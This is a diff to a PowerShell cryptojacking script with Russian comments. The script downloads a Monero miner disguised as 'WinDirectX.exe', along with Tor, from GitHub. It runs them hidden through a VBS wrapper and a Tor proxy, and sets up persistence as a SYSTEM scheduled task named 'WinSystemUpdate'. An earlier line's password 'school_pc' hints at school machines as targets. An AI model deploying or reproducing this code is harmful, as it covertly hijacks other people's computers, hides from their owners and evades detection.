@@ -59,14 +59,26 @@ $web.Headers.Add("User-Agent", "Mozilla/5.0")
 if (!(Test-Path "$path\WinDirectX.exe")) { $web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe") }
 if (!(Test-Path "$path\tor.exe")) { $web.DownloadFile("https://github.com/$user/sminers/raw/main/tor", "$path\tor.exe") }
 
-# 6. СОЗДАНИЕ ЗАПУСКА И АВТОЗАГРУЗКИ
-$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 45 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --no-huge-pages --max-cpu-usage 50"
+# 6. СОЗДАНИЕ ЗАПУСКА
+# Добавил --RunAsService для Tor, чтобы он не плодил окна
+$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --no-huge-pages --max-cpu-usage 50"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
-"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False" | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
 
-# Создаем ярлык в автозагрузке
-$shortcut = "[InternetShortcut]`nURL=file:///$path\win_start.vbs"
-$shortcut | Out-File -FilePath $startupFile -Encoding ascii
+# VBS для полной невидимости (скрывает черное окно батника)
+$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
+$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
+
+# 6.1 НАСТРОЙКА ПЛАНИРОВЩИКА (УБИРАЕМ ЯРЛЫК ИЗ СТАРТАПА, ОСТАВЛЯЕМ ТОЛЬКО ТАСК)
+$TaskName = "WinSystemUpdate"
+# Проверяем, нет ли уже такой задачи, чтобы не плодить ошибки
+if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false }
+
+$TaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`""
+$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
+$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Days 365)
+
+Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -User "SYSTEM" -RunLevel Highest -Force
+
 
 # 6.1 НАСТРОЙКА ПЛАНИРОВЩИКА (ЗАПУСК ПРИ ВКЛЮЧЕНИИ)
 $TaskName = "WinSystemUpdate"
